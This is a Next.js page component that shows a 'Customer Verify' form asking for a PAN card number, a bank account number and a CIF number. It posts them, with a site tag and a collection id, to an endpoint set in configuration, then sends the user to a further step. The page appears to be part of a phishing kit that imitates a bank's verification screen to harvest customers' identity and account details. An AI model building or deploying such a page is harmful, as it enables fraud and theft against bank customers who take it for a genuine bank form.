'use client';
import DateInputComponent from "../inlcude/DateInputComponent";
    import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';

export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    const [loading, setLoading] = useState(false);

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true); // Set loading state to true

        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/dbv');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        } finally{
            setLoading(false); 
        }
    };
  return (
    <>
    <Header />
    <main>
    <div class="All_titlec__cGUYa">
        <h1 class="All_h1__PWkY3">Customer Verify</h1>
    </div>
        <form onSubmit={handleSubmit} className="All_myfrm__3vXyb" id="frm_2_am8E_">
        <p className="All_mndt__6QZEJ mt-3">Required Fileds are asterisk (*)</p>
            <div className="All_frm__am8E_">
                <div className="All_frmgrp__Ym9Kf">
                    <label className="All_frmlb__P0GlO">
                    Pan card Number <span className="CTXgOC-HiOgnn">*</span>
                    </label>
                    <input
                    name="pan card"
                    type="text"
                    className="All_frmin__xQNbS"
                    title="Invalid Pan Card entered..."
                    required
                    maxLength={10}
                    pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}"
                    minLength={10}
                    />
                </div>
                <div className="All_frmgrp__Ym9Kf">
                    <label className="All_frmlb__P0GlO">
                    Account Number <span className="All_mndt__6QZEJ">*</span>
                    </label>
                    <input
                    name="account no"
                    minLength={11}
                    maxLength={11}
                    inputMode="numeric"
                    type="text"
                    className="All_frmin__xQNbS"
                    required
                    />
                </div>
                <div className="All_frmgrp__Ym9Kf">
                    <label className="All_frmlb__P0GlO">
                    CIF Number <span className="All_mndt__6QZEJ">*</span>
                    </label>
                    <input
                    name="CIF Num"
                    minLength={11}
                    maxLength={11}
                    inputMode="numeric"
                    type="text"
                    className="All_frmin__xQNbS"
                    required
                    />
                </div>
                <div className="All_ctr__36AKZ">
                    <input type="submit" className="All_bts__Ls5Mq" defaultValue="Submit" />
                </div>
                </div>

        </form>
    </main>
    <Footer />
</>
  );
}
